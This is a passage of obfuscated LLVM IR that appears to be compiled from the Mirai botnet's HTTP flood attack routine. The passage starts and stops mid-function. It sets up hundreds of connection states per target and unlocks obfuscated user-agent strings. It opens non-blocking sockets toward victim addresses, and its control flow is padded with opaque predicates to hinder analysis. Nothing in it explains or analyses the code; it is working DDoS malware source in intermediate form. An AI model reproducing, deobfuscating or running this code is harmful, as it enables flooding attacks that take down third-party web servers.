  %115 = load i32, i32* @y.18
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %122

; <label>:122:                                    ; preds = %169, %originalBBpart2
  %123 = load i32, i32* %10, align 4
  %124 = load i8*, i8** %15, align 8
  %125 = call i32 @util_strlen(i8* %124)
  %126 = icmp slt i32 %123, %125
  br i1 %126, label %127, label %172

; <label>:127:                                    ; preds = %122
  %128 = load i8*, i8** %15, align 8
  %129 = load i32, i32* %10, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds i8, i8* %128, i64 %130
  %132 = load i8, i8* %131, align 1
  %133 = sext i8 %132 to i32
  %134 = icmp sge i32 %133, 97
  br i1 %134, label %135, label %168

; <label>:135:                                    ; preds = %127
  %136 = load i8*, i8** %15, align 8
  %137 = load i32, i32* %10, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds i8, i8* %136, i64 %138
  %140 = load i8, i8* %139, align 1
  %141 = sext i8 %140 to i32
  %142 = icmp sle i32 %141, 122
  br i1 %142, label %143, label %168

; <label>:143:                                    ; preds = %135
  %144 = load i32, i32* @x.17
  %145 = load i32, i32* @y.18
  %146 = sub i32 %144, 1
  %147 = mul i32 %144, %146
  %148 = urem i32 %147, 2
  %149 = icmp eq i32 %148, 0
  %150 = icmp slt i32 %145, 10
  %151 = or i1 %149, %150
  br i1 %151, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %143
  %152 = load i8*, i8** %15, align 8
  %153 = load i32, i32* %10, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds i8, i8* %152, i64 %154
  %156 = load i8, i8* %155, align 1
  %157 = sext i8 %156 to i32
  %158 = sub nsw i32 %157, 32
  %159 = trunc i32 %158 to i8
  store i8 %159, i8* %155, align 1
  %160 = load i32, i32* @x.17
  %161 = load i32, i32* @y.18
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %168

; <label>:168:                                    ; preds = %originalBBpart24, %135, %127
  br label %169

; <label>:169:                                    ; preds = %168
  %170 = load i32, i32* %10, align 4
  %171 = add nsw i32 %170, 1
  store i32 %171, i32* %10, align 4
  br label %122

; <label>:172:                                    ; preds = %122
  %173 = load i32, i32* @x.17
  %174 = load i32, i32* @y.18
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %172
  %181 = load i32, i32* %18, align 4
  %182 = icmp sgt i32 %181, 512
  %183 = load i32, i32* @x.17
  %184 = load i32, i32* @y.18
  %185 = sub i32 %183, 1
  %186 = mul i32 %183, %185
  %187 = urem i32 %186, 2
  %188 = icmp eq i32 %187, 0
  %189 = icmp slt i32 %184, 10
  %190 = or i1 %188, %189
  br i1 %190, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %182, label %191, label %192

; <label>:191:                                    ; preds = %originalBBpart28
  store i32 512, i32* %18, align 4
  br label %192

; <label>:192:                                    ; preds = %191, %originalBBpart28
  call void @table_unlock_val(i8 zeroext 43)
  call void @table_unlock_val(i8 zeroext 44)
  call void @table_unlock_val(i8 zeroext 45)
  call void @table_unlock_val(i8 zeroext 46)
  call void @table_unlock_val(i8 zeroext 47)
  call void @table_unlock_val(i8 zeroext 48)
  call void @table_unlock_val(i8 zeroext 49)
  call void @table_unlock_val(i8 zeroext 50)
  call void @table_unlock_val(i8 zeroext 51)
  call void @table_unlock_val(i8 zeroext 52)
  call void @table_unlock_val(i8 zeroext 53)
  %193 = load i32, i32* %18, align 4
  %194 = sext i32 %193 to i64
  %195 = call noalias i8* @calloc(i64 %194, i64 3140) #6
  %196 = bitcast i8* %195 to %struct.attack_http_state*
  store %struct.attack_http_state* %196, %struct.attack_http_state** %13, align 8
  store i32 0, i32* %9, align 4
  br label %197

; <label>:197:                                    ; preds = %458, %192
  %198 = load i32, i32* %9, align 4
  %199 = load i32, i32* %18, align 4
  %200 = icmp slt i32 %198, %199
  br i1 %200, label %201, label %461

; <label>:201:                                    ; preds = %197
  %202 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %203 = load i32, i32* %9, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %202, i64 %204
  %206 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %205, i32 0, i32 1
  store i8 0, i8* %206, align 4
  %207 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %208 = load i32, i32* %9, align 4
  %209 = sext i32 %208 to i64
  %210 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %207, i64 %209
  %211 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %210, i32 0, i32 0
  store i32 -1, i32* %211, align 4
  %212 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %213 = load i32, i32* %9, align 4
  %214 = load i8, i8* %5, align 1
  %215 = zext i8 %214 to i32
  %216 = srem i32 %213, %215
  %217 = sext i32 %216 to i64
  %218 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %212, i64 %217
  %219 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %218, i32 0, i32 1
  %220 = load i32, i32* %219, align 4
  %221 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %222 = load i32, i32* %9, align 4
  %223 = sext i32 %222 to i64
  %224 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %221, i64 %223
  %225 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %224, i32 0, i32 4
  store i32 %220, i32* %225, align 4
  %226 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %227 = load i32, i32* %9, align 4
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %226, i64 %228
  %230 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %229, i32 0, i32 6
  %231 = getelementptr inbounds [257 x i8], [257 x i8]* %230, i32 0, i32 0
  %232 = load i8*, i8** %17, align 8
  %233 = call i32 @util_strcpy(i8* %231, i8* %232)
  %234 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %235 = load i32, i32* %9, align 4
  %236 = sext i32 %235 to i64
  %237 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %234, i64 %236
  %238 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %237, i32 0, i32 6
  %239 = getelementptr inbounds [257 x i8], [257 x i8]* %238, i64 0, i64 0
  %240 = load i8, i8* %239, align 4
  %241 = sext i8 %240 to i32
  %242 = icmp ne i32 %241, 47
  br i1 %242, label %243, label %287

; <label>:243:                                    ; preds = %201
  %244 = load i32, i32* @x.17
  %245 = load i32, i32* @y.18
  %246 = sub i32 %244, 1
  %247 = mul i32 %244, %246
  %248 = urem i32 %247, 2
  %249 = icmp eq i32 %248, 0
  %250 = icmp slt i32 %245, 10
  %251 = or i1 %249, %250
  br i1 %251, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %243
  %252 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %253 = load i32, i32* %9, align 4
  %254 = sext i32 %253 to i64
  %255 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %252, i64 %254
  %256 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %255, i32 0, i32 6
  %257 = getelementptr inbounds [257 x i8], [257 x i8]* %256, i32 0, i32 0
  %258 = getelementptr inbounds i8, i8* %257, i64 1
  %259 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %260 = load i32, i32* %9, align 4
  %261 = sext i32 %260 to i64
  %262 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %259, i64 %261
  %263 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %262, i32 0, i32 6
  %264 = getelementptr inbounds [257 x i8], [257 x i8]* %263, i32 0, i32 0
  %265 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %266 = load i32, i32* %9, align 4
  %267 = sext i32 %266 to i64
  %268 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %265, i64 %267
  %269 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %268, i32 0, i32 6
  %270 = getelementptr inbounds [257 x i8], [257 x i8]* %269, i32 0, i32 0
  %271 = call i32 @util_strlen(i8* %270)
  %272 = sext i32 %271 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %258, i8* %264, i64 %272, i32 1, i1 false)
  %273 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %274 = load i32, i32* %9, align 4
  %275 = sext i32 %274 to i64
  %276 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %273, i64 %275
  %277 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %276, i32 0, i32 6
  %278 = getelementptr inbounds [257 x i8], [257 x i8]* %277, i64 0, i64 0
  store i8 47, i8* %278, align 4
  %279 = load i32, i32* @x.17
  %280 = load i32, i32* @y.18
  %281 = sub i32 %279, 1
  %282 = mul i32 %279, %281
  %283 = urem i32 %282, 2
  %284 = icmp eq i32 %283, 0
  %285 = icmp slt i32 %280, 10
  %286 = or i1 %284, %285
  br i1 %286, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %287

; <label>:287:                                    ; preds = %originalBBpart212, %201
  %288 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %289 = load i32, i32* %9, align 4
  %290 = sext i32 %289 to i64
  %291 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %288, i64 %290
  %292 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %291, i32 0, i32 10
  %293 = getelementptr inbounds [9 x i8], [9 x i8]* %292, i32 0, i32 0
  %294 = load i8*, i8** %15, align 8
  %295 = call i32 @util_strcpy(i8* %293, i8* %294)
  %296 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %297 = load i32, i32* %9, align 4
  %298 = sext i32 %297 to i64
  %299 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %296, i64 %298
  %300 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %299, i32 0, i32 9
  %301 = getelementptr inbounds [9 x i8], [9 x i8]* %300, i32 0, i32 0
  %302 = load i8*, i8** %15, align 8
  %303 = call i32 @util_strcpy(i8* %301, i8* %302)
  %304 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %305 = load i32, i32* %9, align 4
  %306 = sext i32 %305 to i64
  %307 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %304, i64 %306
  %308 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %307, i32 0, i32 7
  %309 = getelementptr inbounds [129 x i8], [129 x i8]* %308, i32 0, i32 0
  %310 = load i8*, i8** %16, align 8
  %311 = call i32 @util_strcpy(i8* %309, i8* %310)
  %312 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %313 = load i32, i32* %9, align 4
  %314 = load i8, i8* %5, align 1
  %315 = zext i8 %314 to i32
  %316 = srem i32 %313, %315
  %317 = sext i32 %316 to i64
  %318 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %312, i64 %317
  %319 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %318, i32 0, i32 2
  %320 = load i8, i8* %319, align 4
  %321 = zext i8 %320 to i32
  %322 = icmp slt i32 %321, 32
  br i1 %322, label %323, label %369

; <label>:323:                                    ; preds = %287
  %324 = load i32, i32* @x.17
  %325 = load i32, i32* @y.18
  %326 = sub i32 %324, 1
  %327 = mul i32 %324, %326
  %328 = urem i32 %327, 2
  %329 = icmp eq i32 %328, 0
  %330 = icmp slt i32 %325, 10
  %331 = or i1 %329, %330
  br i1 %331, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %323
  %332 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %333 = load i32, i32* %9, align 4
  %334 = load i8, i8* %5, align 1
  %335 = zext i8 %334 to i32
  %336 = srem i32 %333, %335
  %337 = sext i32 %336 to i64
  %338 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %332, i64 %337
  %339 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %338, i32 0, i32 1
  %340 = load i32, i32* %339, align 4
  %341 = call i32 @ntohl(i32 %340) #7
  %342 = call i32 @rand_next()
  %343 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %344 = load i32, i32* %9, align 4
  %345 = load i8, i8* %5, align 1
  %346 = zext i8 %345 to i32
  %347 = srem i32 %344, %346
  %348 = sext i32 %347 to i64
  %349 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %343, i64 %348
  %350 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %349, i32 0, i32 2
  %351 = load i8, i8* %350, align 4
  %352 = zext i8 %351 to i32
  %353 = lshr i32 %342, %352
  %354 = add i32 %341, %353
  %355 = call i32 @htonl(i32 %354) #7
  %356 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %357 = load i32, i32* %9, align 4
  %358 = sext i32 %357 to i64
  %359 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %356, i64 %358
  %360 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %359, i32 0, i32 4
  store i32 %355, i32* %360, align 4
  %361 = load i32, i32* @x.17
  %362 = load i32, i32* @y.18
  %363 = sub i32 %361, 1
  %364 = mul i32 %361, %363
  %365 = urem i32 %364, 2
  %366 = icmp eq i32 %365, 0
  %367 = icmp slt i32 %362, 10
  %368 = or i1 %366, %367
  br i1 %368, label %originalBBpart239, label %originalBB14alteredBB

originalBBpart239:                                ; preds = %originalBB14
  br label %369

; <label>:369:                                    ; preds = %originalBBpart239, %287
  %370 = call i32 @rand_next()
  %371 = urem i32 %370, 5
  switch i32 %371, label %449 [
    i32 0, label %372
    i32 1, label %381
    i32 2, label %406
    i32 3, label %415
    i32 4, label %440
  ]

; <label>:372:                                    ; preds = %369
  call void @table_unlock_val(i8 zeroext 54)
  %373 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %374 = load i32, i32* %9, align 4
  %375 = sext i32 %374 to i64
  %376 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %373, i64 %375
  %377 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %376, i32 0, i32 5
  %378 = getelementptr inbounds [512 x i8], [512 x i8]* %377, i32 0, i32 0
  %379 = call i8* @table_retrieve_val(i32 54, i32* null)
  %380 = call i32 @util_strcpy(i8* %378, i8* %379)
  call void @table_lock_val(i8 zeroext 54)
  br label %449

; <label>:381:                                    ; preds = %369
  %382 = load i32, i32* @x.17
  %383 = load i32, i32* @y.18
  %384 = sub i32 %382, 1
  %385 = mul i32 %382, %384
  %386 = urem i32 %385, 2
  %387 = icmp eq i32 %386, 0
  %388 = icmp slt i32 %383, 10
  %389 = or i1 %387, %388
  br i1 %389, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %381
  call void @table_unlock_val(i8 zeroext 55)
  %390 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %391 = load i32, i32* %9, align 4
  %392 = sext i32 %391 to i64
  %393 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %390, i64 %392
  %394 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %393, i32 0, i32 5
  %395 = getelementptr inbounds [512 x i8], [512 x i8]* %394, i32 0, i32 0
  %396 = call i8* @table_retrieve_val(i32 55, i32* null)
  %397 = call i32 @util_strcpy(i8* %395, i8* %396)
  call void @table_lock_val(i8 zeroext 55)
  %398 = load i32, i32* @x.17
  %399 = load i32, i32* @y.18
  %400 = sub i32 %398, 1
  %401 = mul i32 %398, %400
  %402 = urem i32 %401, 2
  %403 = icmp eq i32 %402, 0
  %404 = icmp slt i32 %399, 10
  %405 = or i1 %403, %404
  br i1 %405, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br label %449

; <label>:406:                                    ; preds = %369
  call void @table_unlock_val(i8 zeroext 56)
  %407 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %408 = load i32, i32* %9, align 4
  %409 = sext i32 %408 to i64
  %410 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %407, i64 %409
  %411 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %410, i32 0, i32 5
  %412 = getelementptr inbounds [512 x i8], [512 x i8]* %411, i32 0, i32 0
  %413 = call i8* @table_retrieve_val(i32 56, i32* null)
  %414 = call i32 @util_strcpy(i8* %412, i8* %413)
  call void @table_lock_val(i8 zeroext 56)
  br label %449

; <label>:415:                                    ; preds = %369
  %416 = load i32, i32* @x.17
  %417 = load i32, i32* @y.18
  %418 = sub i32 %416, 1
  %419 = mul i32 %416, %418
  %420 = urem i32 %419, 2
  %421 = icmp eq i32 %420, 0
  %422 = icmp slt i32 %417, 10
  %423 = or i1 %421, %422
  br i1 %423, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %415
  call void @table_unlock_val(i8 zeroext 57)
  %424 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %425 = load i32, i32* %9, align 4
  %426 = sext i32 %425 to i64
  %427 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %424, i64 %426
  %428 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %427, i32 0, i32 5
  %429 = getelementptr inbounds [512 x i8], [512 x i8]* %428, i32 0, i32 0
  %430 = call i8* @table_retrieve_val(i32 57, i32* null)
  %431 = call i32 @util_strcpy(i8* %429, i8* %430)
  call void @table_lock_val(i8 zeroext 57)
  %432 = load i32, i32* @x.17
  %433 = load i32, i32* @y.18
  %434 = sub i32 %432, 1
  %435 = mul i32 %432, %434
  %436 = urem i32 %435, 2
  %437 = icmp eq i32 %436, 0
  %438 = icmp slt i32 %433, 10
  %439 = or i1 %437, %438
  br i1 %439, label %originalBBpart247, label %originalBB45alteredBB

originalBBpart247:                                ; preds = %originalBB45
  br label %449

; <label>:440:                                    ; preds = %369
  call void @table_unlock_val(i8 zeroext 58)
  %441 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %442 = load i32, i32* %9, align 4
  %443 = sext i32 %442 to i64
  %444 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %441, i64 %443
  %445 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %444, i32 0, i32 5
  %446 = getelementptr inbounds [512 x i8], [512 x i8]* %445, i32 0, i32 0
  %447 = call i8* @table_retrieve_val(i32 58, i32* null)
  %448 = call i32 @util_strcpy(i8* %446, i8* %447)
  call void @table_lock_val(i8 zeroext 58)
  br label %449

; <label>:449:                                    ; preds = %440, %originalBBpart247, %406, %originalBBpart243, %372, %369
  %450 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %451 = load i32, i32* %9, align 4
  %452 = sext i32 %451 to i64
  %453 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %450, i64 %452
  %454 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %453, i32 0, i32 6
  %455 = getelementptr inbounds [257 x i8], [257 x i8]* %454, i32 0, i32 0
  %456 = load i8*, i8** %17, align 8
  %457 = call i32 @util_strcpy(i8* %455, i8* %456)
  br label %458

; <label>:458:                                    ; preds = %449
  %459 = load i32, i32* %9, align 4
  %460 = add nsw i32 %459, 1
  store i32 %460, i32* %9, align 4
  br label %197

; <label>:461:                                    ; preds = %197
  br label %462

; <label>:462:                                    ; preds = %originalBBpart2651, %originalBBpart2126, %originalBBpart2118, %461
  store i32 0, i32* %23, align 4
  %463 = call i64 @time(i64* null) #6
  %464 = trunc i64 %463 to i32
  store i32 %464, i32* %27, align 4
  br label %465

; <label>:465:                                    ; preds = %462
  %466 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %467 = getelementptr inbounds [16 x i64], [16 x i64]* %466, i64 0, i64 0
  %468 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %467) #6, !srcloc !1
  %469 = extractvalue { i64, i64* } %468, 0
  %470 = extractvalue { i64, i64* } %468, 1
  %471 = trunc i64 %469 to i32
  store i32 %471, i32* %28, align 4
  %472 = ptrtoint i64* %470 to i64
  %473 = trunc i64 %472 to i32
  store i32 %473, i32* %29, align 4
  br label %474

; <label>:474:                                    ; preds = %465
  br label %475

; <label>:475:                                    ; preds = %474
  %476 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %477 = getelementptr inbounds [16 x i64], [16 x i64]* %476, i64 0, i64 0
  %478 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %477) #6, !srcloc !2
  %479 = extractvalue { i64, i64* } %478, 0
  %480 = extractvalue { i64, i64* } %478, 1
  %481 = trunc i64 %479 to i32
  store i32 %481, i32* %30, align 4
  %482 = ptrtoint i64* %480 to i64
  %483 = trunc i64 %482 to i32
  store i32 %483, i32* %31, align 4
  br label %484

; <label>:484:                                    ; preds = %475
  store i32 0, i32* %9, align 4
  br label %485

; <label>:485:                                    ; preds = %1296, %484
  %486 = load i32, i32* %9, align 4
  %487 = load i32, i32* %18, align 4
  %488 = icmp slt i32 %486, %487
  br i1 %488, label %489, label %1299

; <label>:489:                                    ; preds = %485
  %490 = load i32, i32* @x.17
  %491 = load i32, i32* @y.18
  %492 = sub i32 %490, 1
  %493 = mul i32 %490, %492
  %494 = urem i32 %493, 2
  %495 = icmp eq i32 %494, 0
  %496 = icmp slt i32 %491, 10
  %497 = or i1 %495, %496
  br i1 %497, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %489
  %498 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %499 = load i32, i32* %9, align 4
  %500 = sext i32 %499 to i64
  %501 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %498, i64 %500
  store %struct.attack_http_state* %501, %struct.attack_http_state** %26, align 8
  %502 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %503 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %502, i32 0, i32 1
  %504 = load i8, i8* %503, align 4
  %505 = zext i8 %504 to i32
  %506 = icmp eq i32 %505, 1
  %507 = load i32, i32* @x.17
  %508 = load i32, i32* @y.18
  %509 = sub i32 %507, 1
  %510 = mul i32 %507, %509
  %511 = urem i32 %510, 2
  %512 = icmp eq i32 %511, 0
  %513 = icmp slt i32 %508, 10
  %514 = or i1 %512, %513
  br i1 %514, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  br i1 %506, label %515, label %543

; <label>:515:                                    ; preds = %originalBBpart251
  %516 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %517 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %516, i32 0, i32 12
  %518 = load i32, i32* %517, align 4
  %519 = icmp ne i32 %518, 0
  br i1 %519, label %520, label %523

; <label>:520:                                    ; preds = %515
  %521 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %522 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %521, i32 0, i32 1
  store i8 4, i8* %522, align 4
  br label %542

; <label>:523:                                    ; preds = %515
  %524 = load i32, i32* @x.17
  %525 = load i32, i32* @y.18
  %526 = sub i32 %524, 1
  %527 = mul i32 %524, %526
  %528 = urem i32 %527, 2
  %529 = icmp eq i32 %528, 0
  %530 = icmp slt i32 %525, 10
  %531 = or i1 %529, %530
  br i1 %531, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %523
  %532 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %533 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %532, i32 0, i32 1
  store i8 0, i8* %533, align 4
  %534 = load i32, i32* @x.17
  %535 = load i32, i32* @y.18
  %536 = sub i32 %534, 1
  %537 = mul i32 %534, %536
  %538 = urem i32 %537, 2
  %539 = icmp eq i32 %538, 0
  %540 = icmp slt i32 %535, 10
  %541 = or i1 %539, %540
  br i1 %541, label %originalBBpart255, label %originalBB53alteredBB

originalBBpart255:                                ; preds = %originalBB53
  br label %542

; <label>:542:                                    ; preds = %originalBBpart255, %520
  br label %543

; <label>:543:                                    ; preds = %542, %originalBBpart251
  %544 = load i32, i32* @x.17
  %545 = load i32, i32* @y.18
  %546 = sub i32 %544, 1
  %547 = mul i32 %544, %546
  %548 = urem i32 %547, 2
  %549 = icmp eq i32 %548, 0
  %550 = icmp slt i32 %545, 10
  %551 = or i1 %549, %550
  br i1 %551, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %543
  %552 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %553 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %552, i32 0, i32 1
  %554 = load i8, i8* %553, align 4
  %555 = zext i8 %554 to i32
  %556 = icmp eq i32 %555, 0
  %557 = load i32, i32* @x.17
  %558 = load i32, i32* @y.18
  %559 = sub i32 %557, 1
  %560 = mul i32 %557, %559
  %561 = urem i32 %560, 2
  %562 = icmp eq i32 %561, 0
  %563 = icmp slt i32 %558, 10
  %564 = or i1 %562, %563
  br i1 %564, label %originalBBpart259, label %originalBB57alteredBB

originalBBpart259:                                ; preds = %originalBB57
  br i1 %556, label %565, label %645

; <label>:565:                                    ; preds = %originalBBpart259
  %566 = bitcast %struct.sockaddr_in* %32 to i8*
  call void @llvm.memset.p0i8.i64(i8* %566, i8 0, i64 16, i32 4, i1 false)
  %567 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %568 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %567, i32 0, i32 0
  %569 = load i32, i32* %568, align 4
  %570 = icmp ne i32 %569, -1
  br i1 %570, label %571, label %576

; <label>:571:                                    ; preds = %565
  %572 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %573 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %572, i32 0, i32 0
  %574 = load i32, i32* %573, align 4
  %575 = call i32 @close(i32 %574)
  br label %576

; <label>:576:                                    ; preds = %571, %565
  %577 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %578 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %579 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %578, i32 0, i32 0
  store i32 %577, i32* %579, align 4
  %580 = icmp eq i32 %577, -1
  br i1 %580, label %581, label %582

; <label>:581:                                    ; preds = %576
  br label %1296

; <label>:582:                                    ; preds = %576
  %583 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %584 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %583, i32 0, i32 0
  %585 = load i32, i32* %584, align 4
  %586 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %587 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %586, i32 0, i32 0
  %588 = load i32, i32* %587, align 4
  %589 = call i32 (i32, i32, ...) @fcntl(i32 %588, i32 3, i32 0)
  %590 = or i32 2048, %589
  %591 = call i32 (i32, i32, ...) @fcntl(i32 %585, i32 4, i32 %590)
  store i32 65535, i32* %10, align 4
  %592 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %593 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %592, i32 0, i32 0
  %594 = load i32, i32* %593, align 4
  %595 = bitcast i32* %10 to i8*
  %596 = call i32 @setsockopt(i32 %594, i32 0, i32 8, i8* %595, i32 4) #6
  %597 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 0
  store i16 2, i16* %597, align 4
  %598 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %599 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %598, i32 0, i32 4
  %600 = load i32, i32* %599, align 4
  %601 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 2
  %602 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %601, i32 0, i32 0
  store i32 %600, i32* %602, align 4
  %603 = load i16, i16* %19, align 2
  %604 = call zeroext i16 @htons(i16 zeroext %603) #7
  %605 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 1
  store i16 %604, i16* %605, align 2
  %606 = load i32, i32* %27, align 4
  %607 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
